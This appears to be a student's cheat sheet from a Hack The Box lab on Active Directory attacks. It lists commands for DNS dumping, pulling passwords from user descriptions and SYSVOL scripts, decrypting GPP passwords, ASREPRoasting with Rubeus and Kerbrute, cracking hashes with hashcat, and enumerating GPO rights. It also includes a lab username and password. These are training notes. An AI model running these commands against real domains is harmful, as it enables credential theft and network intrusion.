
## DNS Enum

#### Domain Enumeration within AD Domain
```shell-session
Tachipy@htb[/htb]$ adidnsdump -u inlanefreight\\forend ldap://172.16.5.5 
```
#### Using the -r Option to Resolve Unknown Records

  Using the -r Option to Resolve Unknown Records

```shell-session
Tachipy@htb[/htb]$ adidnsdump -u inlanefreight\\forend ldap://172.16.5.5 -r
```
## Password in Description
---
#### Finding Passwords in the Description Field using Get-Domain User

  Finding Passwords in the Description Field using Get-Domain User

```powershell-session
PS C:\htb> Get-DomainUser * | Select-Object samaccountname,description |Where-Object {$_.Description -ne $null}
```
## PASSWD_NOTREQD Field

#### Checking for PASSWD_NOTREQD Setting using Get-DomainUser

```powershell-session
PS C:\htb> Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol
```
## Credentials in SMB Shares and SYSVOL Scripts

#### Discovering an Interesting Script

```powershell-session
PS C:\htb> ls \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts
```
#### Finding a Password in the Script
```powershell-session
PS C:\htb> cat \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts\reset_local_admin_pass.vbs
```
#### Decrypting the Password with gpp-decrypt

```shell-session
Tachipy@htb[/htb]$ gpp-decrypt VPe/o9YRyz2cksnYRbNeQj35w9KxQ5ttbvtRaAVqxaE
```
#### Locating & Retrieving GPP Passwords with CrackMapExec

```shell-session
Tachipy@htb[/htb]$ crackmapexec smb -L | grep gpp
```
#### Using CrackMapExec's gpp_autologin Module

```shell-session
Tachipy@htb[/htb]$ crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologin
```
## ASREPRoasting
#### Enumerating for DONT_REQ_PREAUTH Value using Get-DomainUser
```powershell-session
PS C:\htb> Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl
```
#### Retrieving AS-REP in Proper Format using Rubeus

```powershell-session
PS C:\htb> .\Rubeus.exe asreproast /user:ygroce /nowrap /format:hashcat
```
#### Cracking the Hash Offline with Hashcat

```shell-session
Tachipy@htb[/htb]$ hashcat -m 18200 ilfreight_asrep /usr/share/wordlists/rockyou.txt 
```
#### Retrieving the AS-REP Using Kerbrute

```shell-session
Tachipy@htb[/htb]$ kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt 
```
#### Hunting for Users with Kerberoast Pre-auth Not Required
```shell-session
Tachipy@htb[/htb]$ GetNPUsers.py INLANEFREIGHT.LOCAL/ -dc-ip 172.16.5.5 -no-pass -usersfile valid_ad_users 
```
## Group Policy Object (GPO) Abuse
#### Enumerating GPO Names with PowerView

```powershell-session
PS C:\htb> Get-DomainGPO |select displayname
```
#### Enumerating GPO Names with a Built-In Cmdlet

  Enumerating GPO Names with a Built-In Cmdlet

```powershell-session
PS C:\htb> Get-GPO -All | Select DisplayName
```
#### Enumerating Domain User GPO Rights

```powershell-session
PS C:\htb> $sid=Convert-NameToSid "Domain Users"
PS C:\htb> Get-DomainGPO | Get-ObjectAcl | ?{$_.SecurityIdentifier -eq $sid}
```
#### Converting GPO GUID to Name

  Converting GPO GUID to Name

```powershell-session
PS C:\htb Get-GPO -Guid 7CA9C789-14CE-46E3-A722-83F4097AF532
```